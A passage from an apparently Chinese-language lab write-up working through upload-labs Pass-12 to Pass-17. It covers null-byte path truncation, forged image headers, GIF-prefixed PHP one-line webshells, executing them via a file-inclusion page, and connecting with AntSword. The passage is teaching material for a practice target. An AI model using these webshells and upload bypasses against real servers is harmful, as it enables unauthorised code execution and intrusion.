在哪），并且自行在 <kbd>php.ini</kbd> 配置文件中添加了关闭 <kbd>magic_quotes_gpc</kbd> 函数的配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magic_quotes_gpc = Off</span><br></pre></td></tr></table></figure><blockquote><p>自行下载的 PHP 完整配置请参照 <a href="#Pass-16">Pass-16</a></p></blockquote></li><li><p>准备好木马文件并且以 <kbd>.jpg</kbd> 结尾，暂时伪装成图片文件：</p><img src="https://bu.dusays.com/2022/05/12/627d003b2bc3d.webp" alt="" style="zoom: 75%;" /></li><li><p>打开 <kbd>BurpSuite</kbd> 抓包，我们显然无法在文件上传之前直接在网页上修改路径内容，因此我们对报文进行修改。修改路径变量 <kbd>save_path</kbd> 为 <kbd>../h-t-m.php%00</kbd>：</p><img src="https://bu.dusays.com/2022/05/12/627d003bf1fdf.webp" alt="" style="zoom: 75%;" /></li><li><kbd>Forward</kbd> 之后，上传成功！<img src="https://bu.dusays.com/2022/05/12/627d00a0aca20.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="夺旗-11">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/12/627d00a15e6fd.webp" alt="" style="zoom: 75%;" /><p>注意我们依然只需要连接到php木马文件而不是图片文件，毕竟那些都已经被忽略了。</p></li><li><p>本地无旗可夺，看个目录解解馋吧</p><img src="https://bu.dusays.com/2022/05/12/627d00a240e4d.webp" alt="" style="zoom: 75%;" /></li></ul><h2 id="Pass-13">Pass-13</h2><h3 id="启动靶机-23">启动靶机</h3><ul><li><p>再次回到起点</p><img src="https://bu.dusays.com/2022/05/12/627d00a330629.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究页面-8">研究页面</h3><ul><li><p>本关与上一关几乎一致，唯一不同的地方在于源码中的这一句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><p>将上一关的 <kbd>&#36;&#95;GET[]</kbd> 换成了 <kbd>&#36;&#95;POST[]</kbd> ，代表了网页提交表单的两种方法。</p></li><li><p>关于两种方法的大致区别可以 <a href="https://www.w3school.com.cn/tags/html_ref_httpmethods.asp">参考这里</a> ，在本关卡中的区别主要是<kbd>GET</kbd> 方法会自动解码，即把 <kbd>%00</kbd> 解码为对应的空字符，而 <kbd>POST</kbd> 方法则不会自动解码，他对百分号没有任何特殊感情。</p></li><li><p>既然不能直接传编码形式的，我们就只能原样传进去了，当然靠输入是肯定没办法输入进去空字符的，因此我们需要修改二进制的报文，直接输入空值！</p></li></ul><h3 id="突破限制-14">突破限制</h3><ul><li><p>打开 <kbd>BurpSuite</kbd> 上传上一关相同的文件（以 <kbd>.jpg</kbd> 后缀作为伪装的 php 木马文件），我们可以在 <kbd>Raw</kbd> 模式下编辑好路径，最后留下一个字符便于我们修改，这里预留一个 <kbd>/</kbd> 字符：</p><img src="https://bu.dusays.com/2022/05/12/627d00a3e831c.webp" alt="" style="zoom: 75%;" /><p>在二进制（<kbd>Hex</kbd>）中找到对应字符，将其修改为 <code>00</code> 即可：</p><img src="https://bu.dusays.com/2022/05/12/627d00a5bad0c.webp" alt="" style="zoom: 75%;" /><img src="https://bu.dusays.com/2022/05/12/627d00a4bef7b.webp" alt="" style="zoom: 75%;" /><p>当然也可以直接在 <kbd>Raw</kbd> 下输入 <kbd>../h-t-m.php%00</kbd> 并且右键解码即可：</p><img src="https://bu.dusays.com/2022/05/12/627d002e67375.webp" alt="" style="zoom: 75%;" /></li><li><p>然后当然是 <kbd>Forward</kbd> 并且上传成功：</p><img src="https://bu.dusays.com/2022/05/12/627d002d1b56e.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="夺旗-12">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/12/627d00300ecec.webp" alt="" style="zoom: 75%;" /></li><li><p>依旧无旗可夺~浅看一下目录吧</p><img src="https://bu.dusays.com/2022/05/12/627d0030ba50b.webp" alt="" style="zoom: 75%;" /></li></ul><h2 id="Pass-14">Pass-14</h2><h3 id="启动靶机-24">启动靶机</h3><ul><li><p>再次<s>回到</s>，哎界面变了：</p><img src="https://bu.dusays.com/2022/05/12/627d002d73bea.webp" alt="" style="zoom: 75%;" /><p>欢迎进入图片马时代！</p></li></ul><h3 id="研究页面-9">研究页面</h3><ul><li><p>先查看提示：</p><img src="https://bu.dusays.com/2022/05/15/6280fa2a2ce14.webp" alt="" style="zoom: 75%;" /><p>对图片的内容开头两个字节进行检查，意味着我们修改修改文件名，改改 <kbd>MIME</kbd> 是肯定不行了，他得是货真价实的图片文件了。</p></li><li><p>至于为什么只用检查文件开头两个字节就能判断文件是否为合法的图片文件，因为那块地方是文件头啊！比如 <kbd>.jpg</kbd> 的文件头字段就是 <kbd>FFD8FF</kbd> ，我们可以在  <kbd>VS code</kbd> 中使用 <kbd>hexdump for VSCode</kbd> 插件查看一张 <kbd>.jpg</kbd> 的图片：</p><img src="https://bu.dusays.com/2022/05/15/6280fa2c9d8a8.webp" alt="" style="zoom: 75%;" /><p>而 <kbd>.png</kbd> 的文件头字段为 <kbd>89504E47</kbd> ，我们用同样的方法打开一个 <kbd>.png</kbd> 的图片即可验证：</p><img src="https://bu.dusays.com/2022/05/15/6280fa2f95b84.webp" alt="" style="zoom: 75%;" /><p>而如果我们将 <kbd>.jpg</kbd> 后缀换成 <kbd>.png</kbd> 后缀再打开文件，会发现：</p><img src="https://bu.dusays.com/2022/05/15/6280fa2d54024.webp" alt="" style="zoom: 75%;" /><p>文件头不会随后缀名的改变而改变，或者更加粗鲁地说，文件的真实类型就取决于文件头。因此，我们能做的，就是将木马内嵌到一个真实且合法的图片文件中，也就是所谓的<strong>图片马</strong>。</p></li><li><p>另外一个重要问题是，藏在图片中的木马如何才能运行起来。</p><p>在进入 Pass-14 时，作者给了三条注意事项，其中第二条就是针对这个问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.使用文件包含漏洞能运行图片马中的恶意代码。</span><br></pre></td></tr></table></figure><p>也就是说，为了运行代码，靶机中预留了文件包含漏洞，同时这也意味着本关漏洞必须配合文件包含漏洞食用。</p></li><li><p>关于这是如何实现的，我们可以先看一下这段文件包含漏洞的代码：</p><blockquote><p>本关就是由于 BUU 上未知原因该代码打不开，所以切换至本地靶机。经测试 BUU 平台文件正常，因此这里挖个坑，日后有能力再来解答。</p><img src="https://bu.dusays.com/2022/05/15/6280fa40dae11.webp" alt="" style="zoom: 75%;" /></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><kbd>header()</kbd> 方法作用就是传送 <kbd>HTML</kbd> 文档标头以告诉浏览器如何处理这个页面，参数内容表示页面内容为 <kbd>html</kbd>，编码为 <kbd>utf-8</kbd>。<p>然后 <kbd>&#36;file</kbd> 通过 <kbd>GET</kbd> 方法接收一个变量 <kbd>file</kbd>，<kbd>isset()</kbd> 则用于判断是否非空。也就是说，如果接收到了数据，数据内容就会被 <kbd>include</kbd> ，而如果没有接收到，则会显示 PHP 中的一个常量 <kbd>&#95;&#95;file&#95;&#95;</kbd> 。</p></li><li><p>而所谓文件包含，就是让服务器执行程序时通过包含函数加载另一个文件中的代码并且执行。有 <kbd>include()</kbd>、<kbd>require()</kbd>、<kbd>include_once()</kbd> 和 <kbd>require_once()</kbd> 四种，其中 <kbd>include()</kbd> 表示执行该语句时包含，而 <kbd>require()</kbd> 表示程序运行开始就包含，后面两种则分别表示前面两种的不重复包含版本，即文件中代码已被包含则不会再次包含。</p></li><li><p>本关中我们上传的图片马中就会包含一句话木马，而木马的激活需要让 PHP 代码被执行，靶机中预留的文件包含漏洞代码中就使用了 <kbd>include</kbd> 函数，因此就可以用文件包含的形式将我们上传的文件内容作为 PHP 代码执行。我们需要做的就是将上传的文件用 <kbd>GET</kbd> 方法传递给该漏洞文件的 <kbd>file</kbd> 变量，我们在前面关卡中也使用过 <kbd>GET</kbd> 方法，只需在 URL 后添加 <kbd>?file=[文件路径]</kbd> 即可传递。</p></li></ul><h3 id="突破限制-15">突破限制</h3><ul><li><p>首先构建图片马，可以采用两种方法，一种是将木马通过文本编辑器（或者命令行）写入图片文件，另一种则是在文本文件输入合法文件头，然后将木马代码直接放在文件头之后。</p></li><li><p>这里先解释第二种方法，为什么文本文件中可以直接存放文件头且合法，文本自身的文件头不起作用吗？</p><ul><li><p>在 Windows 中，我们保存一个文本文件的默认编码都是 <kbd>UTF-8</kbd>，而当我们选择另存为时，会发现还可以选择其他几种编码：</p><p><img src="https://bu.dusays.com/2022/05/15/6280fa4251484.webp" alt="" style="zoom: 25%;" /> <img src="https://bu.dusays.com/2022/05/15/6280fa4306154.webp" alt="" style="zoom: 25%;" /></p><p>这几种编码的具体内容在这不作讨论，只需知道 <kbd>ANSI</kbd> 编码与 <kbd>UTF-8</kbd> 编码是没有文件头的。值得注意的是，<kbd>UTF-8 BOM</kbd> 中的 <kbd>BOM</kbd> 就是 <kbd>UTF-8</kbd> 的文件头的意思，据说之前 Windows 默认就是带文件头版本的 <kbd>UTF-8</kbd> 编码，这里不做考证，如遇到问题修改为 <kbd>ANSI</kbd> 编码即可。</p><p>此外，为明确基本概念，我们还需要知道这里的 <kbd>ANSI</kbd> 编码并不是意味着使用一种叫 <kbd>ANSI</kbd> 的编码，而是根据系统环境为我们选择特定的编码。如图，用记事本打开一张图片，编码就默认为 <kbd>ANSI</kbd>：</p><img src="https://bu.dusays.com/2022/05/15/6280fa43afbe7.webp" alt="" style="zoom: 75%;" /><p>当然实际编码为 <kbd>GBK</kbd>，因为我的电脑是简体中文版的。</p></li><li><p>因此，我们直接编辑一个只含有文件头加 PHP 代码的文本文件。合法的文件头的十六进制数值有三种，<kbd>.jpg</kbd> 的 <kbd>FFD8FF</kbd>，<kbd>.png</kbd> 的 <kbd>89504E47</kbd> 以及 <kbd>.gif</kbd> 的 <kbd>47494638</kbd>。可以在 <kbd>UltraEdit</kbd> 的十六进制模式下直接将文件头值写入，当然并不建议这样做，既然选择直接构建文本，直接输入文件头数值对应的字符不就好了。</p></li><li><p>话虽这么说，就像前面所看到的，数值对应的字符实际上我们并不能直接输入：</p><img src="https://bu.dusays.com/2022/05/15/6280fa2f95b84.webp" alt="" style="zoom: 75%;" /><img src="https://bu.dusays.com/2022/05/15/6280fa2c9d8a8.webp" alt="" style="zoom: 75%;" /><p>点表示无法显示的字符，也就是说 <code>.png</code> 和 <code>.jpg</code> 文件显然不能直接输入字符完成了。但是还有一个“友好”的格式：<code>.gif</code></p><img src="https://bu.dusays.com/2022/05/15/6280fa4193e68.webp" alt="" style="zoom: 75%;" /><p>可以看到，他的文件头的字符就是 <kbd>GIF89a</kbd> ，因此我们的文本内容可以直接为 <code>GIF89a &lt;?php @eval($_POST[&quot;h-t-m&quot;]);?&gt;</code> 。为了方便查看木马执行情况，在一句话木马中我们加入 <kbd>phpinfo();</kbd> 用于在页面中显示 PHP 环境信息，也就是 <code>GIF89a &lt;?php @eval($_POST[&quot;h-t-m&quot;]);phpinfo();?&gt;</code> . 当然，由于只检查两个字节，因此 <kbd>GIF89a</kbd> 也不用完全输入，这里保持文件头完整性，<psw>一不小心还兼容了下一关</psw>。</p></li><li><p>只要编码正确，后缀名他又不检查，因此，我们的文件直接使用 <kbd>.php</kbd> 后缀也没事：</p><img src="https://bu.dusays.com/2022/05/15/6280fa445a84f.webp" alt="" style="zoom: 75%;" /><p>显然我的 PHP 文件已经进入编译器时代了（指图标）。</p></li><li><p>上传文件，完成！</p><img src="https://bu.dusays.com/2022/05/15/6280fa44f223b.webp" alt="" style="zoom: 75%;" /><p>可以看到文件已经被识别为 GIF 文件并且重命名好放在 <kbd>upload</kbd> 目录下了：</p><img src="https://bu.dusays.com/2022/05/15/6280fa459ee23.webp" alt="" style="zoom: 75%;" /></li></ul></li><li><p>不急，再讨论一下第一种方法，把代码放入图片文件中。</p><ul><li><p>理论上只需要在记事本中打开并添加代码即可。使用记事本打开图像时，他实际上并不能正确识别如图像等非文本文件，记事本只是简单地将字节流视为 <kbd>ANSI</kbd> 编码的文本打开。当然这对文件不会造成太大影响，但是重点在于，当你保存文件时，记事本不会保留特殊字符，也就是说，无论你是否对内容进行操作，记事本都会以 <kbd>ANSI</kbd> 的标准修改数据。例如替换映射特殊/未定义/禁止字符的字节，因为它们对于有效的 <kbd>ANSI</kbd> 文本没有意义，或者将空字符、行尾和文件序列结尾重新编码为 Windows / DOS 约定（如 Windows 系统中行尾使用两个字符表示：<kbd>CRLF</kbd>，即回车和换行）。关于 <kbd>ANSI</kbd> 的更多讨论可以 <a href="https://stackoverflow.com/questions/701882/what-is-ansi-format">参考这里</a> ，我们只需意识到，使用记事本对图片进行修改是绝对不可取的，即使你不做修改。</p></li><li><p>我们可以使用 <kbd>NotePad++</kbd> 或者 <kbd>UltraEdit</kbd> 等可以完成十六进制编辑的编辑器进行修改，只要保持文件头，我们可以在任意位置插入木马：</p><img src="https://bu.dusays.com/2022/05/15/6280fa467f3ce.webp" alt="" style="zoom: 75%;" /></li><li><p>不过还有一种更加优雅的方式，就是在命令行中使用 <kbd>copy</kbd> 命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy [图片文件名] /b + [木马文件名] /a [合成后的文件名]</span><br></pre></td></tr></table></figure><kbd>/b</kbd> 意为使用二进制打开文件，<kbd>/a</kbd> 意为使用文本方式打开文件，因此上述指令的意思就是，打开二进制流图片并在后方接入木马文本内容，合成的文件以最后的参数作为文件名另存。<img src="https://bu.dusays.com/2022/05/15/6280fa477886e.webp" alt="" style="zoom: 75%;" /><p>可以在编辑器中验证合成的结果：</p><img src="https://bu.dusays.com/2022/05/15/6280fa48321cf.webp" alt="" style="zoom: 75%;" /></li><li><p>上传修改后的图片文件，成功！</p><img src="https://bu.dusays.com/2022/05/15/6280fa44f223b.webp" alt="" style="zoom: 75%;" /><p>当然，一个小建议是使用较<strong>小</strong>的图片文件，毕竟图片只是个借口，何况图片中的字符多了我们也把控不住！</p></li></ul></li></ul><h3 id="夺旗-13">夺旗</h3><ul><li><p>经上文分析，将构造好的文件上传至服务器后，在含有文件包含漏洞的页面 URL 后添加 <kbd>?file=[文件路径]</kbd> 即可，点开题目中的漏洞链接即可值得漏洞文件所在的地址，即在网页根目录处：</p><p><img src="https://bu.dusays.com/2022/05/15/6280fa2a23406.webp" alt="" style="zoom: 25%;" />   <img src="https://bu.dusays.com/2022/05/15/6280fa2e18d8e.webp" alt="" style="zoom: 25%;" /></p><p>为了直观验证木马执行情况，我们在一句话木马代码中预留了 <kbd>phpinfo()</kbd>，因此直接打开页面即可观察到：</p><img src="https://bu.dusays.com/2022/05/15/6280fa2b48707.webp" alt="" style="zoom: 75%;" /><p>显示了 PHP 的信息，因此木马成功被包含并执行了！</p></li><li><p>那么接下来就是蚁剑连接了，值得注意的是，我们的链接应该指向代码作用之处。之前的关卡由于代码直接就执行了，因此连接到文件即可，而这一次代码是被包含到 <kbd>include.php</kbd> 之后才被执行的，因此应指向<strong>包含木马后</strong>的 <kbd>include.php</kbd> 文件，即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机地址]/include.php?file=upload/[文件名]</span><br></pre></td></tr></table></figure></li><li><p>创建连接，显然是应该成功的。</p><img src="https://bu.dusays.com/2022/05/15/6280fa2ecb8da.webp" alt="" style="zoom: 75%;" /></li><li><p>夺旗！连接成功了就行，想必本地目录也看累了，既然无旗可夺，不如看个视频放松一下。</p><iframe src="//player.bilibili.com/player.html?aid=768208334&bvid=BV1Ar4y1H7bk&cid=574525358&page=1&danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" allowfullscreen="allowfullscreen" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe></li></ul><h2 id="Pass-15">Pass-15</h2><h3 id="启动靶机-25">启动靶机</h3><ul><li><p>来了来了第 15 关</p><img src="https://bu.dusays.com/2022/05/16/6282624230e7c.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究页面-10">研究页面</h3><ul><li><p>直接看提示</p><img src="https://bu.dusays.com/2022/05/16/62826245609c3.webp" alt="" style="zoom: 75%;" /><p>使用 <kbd>getimagesize()</kbd> 检查图片文件。</p></li><li><kbd>getimagesize()</kbd> 函数用于获取图像大小及相关信息，成功就会返回一个具有四个单元的数组。索引 0 包含图像宽度的像素值，索引 1 包含图像高度的像素值。索引 2 是图像类型的标记：1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM。这些标记与 PHP 4.3.0 新加的 IMAGETYPE 常量对应。索引 3 是文本字符串，内容为“height="yyy" width="xxx"”，可直接用于 IMG 标记。更多关于该函数可以 [参考这里](https://www.php.net/manual/zh/function.getimagesize.php) 。</li><li><p>查看源码，关键代码为这部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$info</span> = getimagesize(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$ext</span> = image_type_to_extension(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">if</span>(stripos(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到这里使用了 <kbd>getimagesize()</kbd> 函数返回的数组的第三个元素，也就是图像类型。</p></li><li><p>不难看出，本关与 Pass-14 极其相似，不同之处仅仅在于 Pass-14 仅检查文件头两个字节，而本关会检查完整的类型。不过，Pass-14 中的所有方法都包含了完整的文件头，因此本题可直接使用使用。</p></li></ul><h3 id="突破限制-16">突破限制</h3><ul><li><p>随机选择一种 Pass-14 的方法，将文件上传靶机，成功。</p><img src="https://bu.dusays.com/2022/05/16/6282624191294.webp" alt="" style="zoom: 50%;" /></li><li><p>打开文件包含漏洞的文件，BUU 中依旧会出现问题，但是这次就不换本地靶机，因为我怀疑这个问题不影响使用。</p><img src="https://bu.dusays.com/2022/05/16/62826243e20dd.webp" alt="" style="zoom: 75%;" /></li><li><p>在漏洞 URL 后加上 <kbd>?file=upload/[文件名]</kbd> ，当然，上回书说到，服务器会对文件重新以数字序列命名保存，因此切勿使用本地上传时的本地文件名。回车后，果然 BUU 靶机的那个错误并不影响使用，正确显示了 <kbd>phpinfo()</kbd>：</p><img src="https://bu.dusays.com/2022/05/16/62826246ba354.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="夺旗-14">夺旗</h3><ul><li><p>蚁剑连接，与 Pass-14 同款链接（木马执行处）。成功！</p><img src="https://bu.dusays.com/2022/05/16/6282624867cbf.webp" alt="" style="zoom: 75%;" /></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/16/628262497ebd0.webp" alt="" style="zoom: 75%;" /></li></ul><h2 id="Pass-16">Pass-16</h2><h3 id="启动靶机-26">启动靶机</h3><ul><li><p>没几关了，加油网安人</p><img src="https://bu.dusays.com/2022/05/19/6286268308929.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究页面-11">研究页面</h3><ul><li><p>直接看提示</p><img src="https://bu.dusays.com/2022/05/19/6286267c3d1e7.webp" alt="" style="zoom: 75%;" /><p>使用 <kbd>exif_imagetype()</kbd> 检查文件类型。</p></li><li><kbd>exif_imagetype()</kbd> 读取一个图像的第一个字节并检查其签名。当然，这个函数需要开启 <kbd>php_exif</kbd> 模块，在 BUU 平台本关依然没有开启相应模块，因此本关依旧部署于本地。在 <kbd>phpstudy</kbd> 中自带的 <kbd>php</kbd> 版本中直接勾选 <kbd>php_exif</kbd> 模块即可，也可能叫 <kbd>exif</kbd>，都是一样的：<img src="https://bu.dusays.com/2022/05/19/6286268b03a54.webp" alt="" style="zoom: 75%;" /></li><li><p>但是，由于我使用的版本是自己下载的，就无法这样快捷设置了，因此这里示范修改配置。在 Pass-12 中因为版本问题而从官方下载了 <kbd>php 5.2.10</kbd> 的包，当时有个疑问，就是根目录并没有 <kbd>php.ini</kbd> 配置文件。由于当时只是需要修改参数值，因此我就直接新建了 <kbd>php.ini</kbd> 文件并输入修改配置。但是呢，其实官方包不仅不会没有配置文件，甚至还有两个，就是他们：</p><img src="https://bu.dusays.com/2022/05/19/6286268c32212.webp" alt="" style="zoom: 75%;" /><p>而 <kbd>php.ini-dist</kbd> 文件的开始就是这么一段话：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">;;;;;;;;;;;</span><br><span class="line">; WARNING ;</span><br><span class="line">;;;;;;;;;;;</span><br><span class="line">; This is the <span class="keyword">default</span> settings file <span class="keyword">for</span> <span class="keyword">new</span> PHP installations.</span><br><span class="line">; By <span class="keyword">default</span>, PHP installs itself with a configuration suitable <span class="keyword">for</span></span><br><span class="line">; development purposes, <span class="keyword">and</span> *NOT* <span class="keyword">for</span> production purposes.</span><br><span class="line">; <span class="keyword">For</span> several security-oriented considerations that should be taken</span><br><span class="line">; before going online with your site, please consult php.ini-recommended</span><br><span class="line">; <span class="keyword">and</span> http:<span class="comment">//php.net/manual/en/security.php.</span></span><br></pre></td></tr></table></figure><p>也就是说，<kbd>php.ini-dist</kbd> 的安全等级较 <kbd>php.ini-recommended</kbd> 低，开发者安装时默认为 <kbd>php.ini-dist</kbd>。当然他们的具体区别与本关的关系不大，我们只需将其中任意一个文件的内容保存至 <kbd>php.ini</kbd> 文件中即可，这样以后所有的配置都只需修改该文件内容即可。需要注意的一点是，如本关这样需要添加扩展的配置，切记在配置文件中要加上扩展所在路径，一般在 <kbd>php</kbd> 下的 <kbd>ext</kbd> 目录中，只需修改文件中的 <kbd>extension_dir</kbd> 值即可：</p><img src="https://bu.dusays.com/2022/05/19/6286268eabd46.webp" alt="" style="zoom: 75%;" /><p>如果不修改路径就直接进行配置，那么你将会收到一个服务器 500 错误：</p><img src="https://bu.dusays.com/2022/05/19/6286268d93d9b.webp" alt="" style="zoom: 75%;" /><p>对于开启 <kbd>exif</kbd> 可以参考官网对应的 <a href="https://www.php.net/manual/zh/exif.configuration.php">配置说明</a> ：</p><img src="https://bu.dusays.com/2022/05/19/628626901b7ca.webp" alt="" style="zoom: 75%;" /><p>也就是说，我们需要删除 <kbd>extension=php_exif.dll</kbd> 和 <kbd>extension=php_mbstring.dll</kbd> 前的分号（即取消注释），由于 <kbd>extension=php_exif.dll</kbd> 默认置于 <kbd>extension=php_mbstring.dll</kbd> 之前，因此需要修改顺序，将 <kbd>extension=php_mbstring.dll</kbd> 放至前方优先加载，此外在配置文件的  <kbd>exif</kbd> 部分，也需要将所有配置内容取消注释：</p><img src="https://bu.dusays.com/2022/05/19/628626918be31.webp" alt="" style="zoom: 75%;" /><p>这样，就完成了配置。哦对了，事实证明，当我们创建好完整的配置文件之后（路径也配置好），<kbd>phpstudy</kbd> 就可以快捷配置了，不需要一个个去取消注释，直接勾选即可（参照上一条）。虽然有点不信，但不得不说，进行到 <strong>16</strong> 关了，竟然才刚完成本地配置，惭愧惭愧。</p></li><li><p>如何判断配置有没有生效呢，显然生效了才能上传文件，如果不生效，则会收到一个静默的页面：</p><img src="https://bu.dusays.com/2022/05/19/62862692db607.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="突破限制-17">突破限制</h3><ul><li><p>由于 <kbd>exif_imagetype()</kbd> 函数只检查一个字节，因此前面关卡的所有解法都绰绰有余，不得不说这个函数，<psw>你好大的官威啊</psw>。这里直接上传文件，成功。</p><img src="https://bu.dusays.com/2022/05/19/62862693d7eb4.webp" alt="" style="zoom: 75%;" /></li><li><p>向漏洞文件传参，木马成功执行！</p><img src="https://bu.dusays.com/2022/05/19/6286269507e2f.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="夺旗-15">夺旗</h3><ul><li><p>还是意思一下，蚁剑连接！（依然还是那款链接）</p><img src="https://bu.dusays.com/2022/05/19/628626960ca63.webp" alt="" style="zoom: 75%;" /></li><li><p>本地无旗，反正目录不好看，再看个视频放松一下</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=684066279&bvid=BV1YU4y1m7qn&cid=719772987&page=1&danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" allowfullscreen="allowfullscreen" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe></div></li></ul><h2 id="Pass-17">Pass-17</h2><h3 id="启动靶机-27">启动靶机</h3><ul><li><p>最后一个图片马了！</p><img src="https://bu.dusays.com/2022/05/19/62862697d6ebd.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究页面-12">研究页面</h3><ul><li><p>先看提示：</p><img src="https://bu.dusays.com/2022/05/19/6286269940e02.webp" alt="" style="zoom: 75%;" /><p>重新渲染了图片？有意思，看不懂。</p></li><li><p>看看源代码，代码较长，其实大多重复，看这一段即可：</p><img src="https://bu.dusays.com/2022/05/19/6286269a41935.webp" alt="" style="zoom: 75%;" /><p>作者在代码中给了较为详细的注释，大致过程就是先获取上传文件的文件类型和文件名等，文件类型可参考 <a href="#Pass-02">Pass-02</a> ，通过文件类型与文件名的比对以分别使用对应的重渲染函数，当然伪造的后缀与文件类型会导致渲染函数返回 <kbd>false</kbd>，因此文件必须合法。虽然文件上传后才作检测，但是不合法的文件均会通过 <kbd>@unlink()</kbd> 函数删除。</p></li><li><p>我们需要注意的地方就是执行重新渲染的函数，也就是图中的这句以及其他两种类型的对应函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$im</span> = imagecreatefromjpeg(<span class="variable">$target_path</span>);  <span class="comment">// .jpg</span></span><br><span class="line"><span class="variable">$im</span> = imagecreatefrompng(<span class="variable">$target_path</span>);   <span class="comment">// .png</span></span><br><span class="line"><span class="variable">$im</span> = imagecreatefromgif(<span class="variable">$target_path</span>);   <span class="comment">// .gif</span></span><br></pre></td></tr></table></figure><p>这些函数会将对应文件进行重新渲染，也就是说，我们需要想办法让渲染后的文件中依然含有木马代码，这就有点麻烦了！</p></li><li><p>我们有必要好好了解一下 <kbd>.jpg</kbd> 、<kbd>.png</kbd> 和 <kbd>.gif</kbd>.</p><ul><li><p>先从简单的说起，<kbd>.gif</kbd> 文件：GIF</p><p>之前说到，GIF 的文件头为 <kbd>47494638</kbd>，对应字符为 <kbd>GIF8</kbd>，但我们之前都是直接用 <kbd>GIF89a</kbd>，这是 GIF 的一个版本，<kbd>89</kbd> 代表发布年份，还有另一个版本是 <kbd>GIF87a</kbd>，这六个字符便构成了文件的第一个部分——<strong>Header</strong>, 这部分是绝对不会更改的，当然本关我们也没办法利用。后面接的就是文件数据流部分，对数据流的结构这里不作分析，可参考 <a href="https://blog.csdn.net/wzy198852/article/details/17266507">这篇文章</a> 详细解析。</p><p>需要注意的是，GIF 使用 LZW 压缩算法，用于信息的无损压缩，而就是因为无损，数据流中的许多数据都不会在重新渲染时被修改，当然我们不必去了解哪部分被保留，只需上传文件后再下载，在不变的数据中插入木马即可。当然实际原理会更复杂一些，这里不作解释。</p></li><li><p>再看 <kbd>.png</kbd> 文件：PNG</p><p>还是之前说到，PNG 的文件头为 <kbd>89504E47</kbd>，但其实这并不完整，PNG 的文件头实际是固定的 <kbd>89504E470D0A1A0A</kbd> 这八个字节构成。而剩下部分则由 3 